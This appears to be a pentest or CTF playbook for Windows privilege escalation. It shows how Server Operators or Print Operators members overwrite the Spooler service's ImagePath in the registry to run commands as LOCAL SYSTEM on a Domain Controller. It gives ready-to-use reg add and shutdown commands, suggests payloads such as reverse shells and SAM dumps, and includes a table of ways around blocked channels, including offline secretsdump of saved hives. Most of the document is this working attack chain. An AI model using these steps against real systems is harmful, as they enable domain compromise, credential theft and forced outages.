# Server Operators / Print Operators — Service ImagePath Registry Privesc

## When this applies

- Members of `Server Operators`, `Print Operators`, `Backup Operators`, and `Account Operators` retain write access to specific `HKLM\SYSTEM\CurrentControlSet\Services\<svc>` keys even when their WinRM/network token is UAC-filtered (so SCM API calls fail with `OpenSCManager 0x5 / rpc_s_access_denied`).
- Rewriting `ImagePath` of a service the group can edit, then forcing the service to relaunch, gets you arbitrary code as `LOCAL SYSTEM` — including on a Domain Controller.
- Spooler is the canonical pick on a DC for Server Operators / Print Operators.

## Symptom that points here

- WinRM session, group membership shows `Server Operators` / `Print Operators` / etc.
- `whoami /priv` lists `SeRemoteShutdownPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeLoadDriverPrivilege` (typical Server Operators set).
- `[Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators')` → `False` even though the SID is in the token output.
- Any SCM call (`sc.exe`, `services.py`, `Get-Service | Start-Service`, WMI `Win32_Service.StartService`) → access denied. **This is the UAC token filter, not a missing privilege.** Stop trying SCM API.

## Exploit chain

```cmd
:: 1. Save the original ImagePath (cleanup later)
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Spooler" /v ImagePath > %TEMP%\spooler.bak

:: 2. Overwrite with arbitrary command — SCM treats ImagePath as a CreateProcess
::    argument so cmd /c <anything> runs as LOCAL SYSTEM before SCM marks the service
::    failed. Common payloads: copy a flag/file to a readable location, grant Everyone:F,
::    spawn a reverse shell, dump SAM hive, etc.
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Spooler" /v ImagePath /t REG_EXPAND_SZ ^
  /d "cmd /c copy C:\Users\Administrator\Desktop\flag.txt C:\Users\Public\f.txt && icacls C:\Users\Public\f.txt /grant Everyone:F" /f

:: 3. Trigger SCM relaunch
::    a) SeRemoteShutdownPrivilege present → forced reboot (works against a DC):
shutdown /r /t 0 /f
::    b) Otherwise: wait for the next scheduled restart, induce a service crash, or
::       trigger a dependent service restart that pulls Spooler with it.

:: 4. After reboot/relaunch the payload has run. Restore ImagePath:
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Spooler" /v ImagePath /t REG_EXPAND_SZ ^
  /d "C:\Windows\System32\spoolsv.exe" /f
```

For non-rebootable boxes, drop a `cmd /c` that creates a SYSTEM scheduled task or writes a SYSTEM-owned file then calls `net stop spooler & net start spooler` from a *separate* WinRM session (the SCM call fails for the filtered token but the side-effect of ImagePath has already executed before SCM gives up).

## Indirect channels when SCM is blocked (filtered token)

| Goal | Don't do | Do instead |
|------|----------|------------|
| Start/stop a service | `sc.exe`, `services.py`, `WMI Win32_Service` | `reg add ... \ImagePath` + reboot trigger |
| Run as SYSTEM | `psexec`, `wmiexec` | Service ImagePath payload (above), schtasks /S /U SYSTEM, COM hijack |
| Reboot the host | `Restart-Computer` (often blocked) | `shutdown /r /t 0 /f` (`SeRemoteShutdownPrivilege`) |
| Dump LSA secrets | `secretsdump.py @host` (needs admin SMB) | `reg save HKLM\SAM/SYSTEM` + offline `secretsdump.py LOCAL -system ... -sam ...` |

## Verifying success

- After the relaunch, `C:\Users\Public\f.txt` (or your chosen output) appears with the contents of the protected file and Everyone:R ACL.
- `dir` from your shell shows the file and you can `type` it.

## Common pitfalls

- `SeRemoteShutdownPrivilege` is required to reboot the DC — verify with `whoami /priv`.
- Forgetting step 4 (restore ImagePath) leaves Spooler broken — service won't start cleanly.
- The `whoami /priv` privilege list lies on filtered tokens — `Get-Service | Start-Service` will still fail. Trust the *registry write* primitive, not the token.

## Tools

- reg.exe / Get-ItemProperty
- shutdown
- icacls
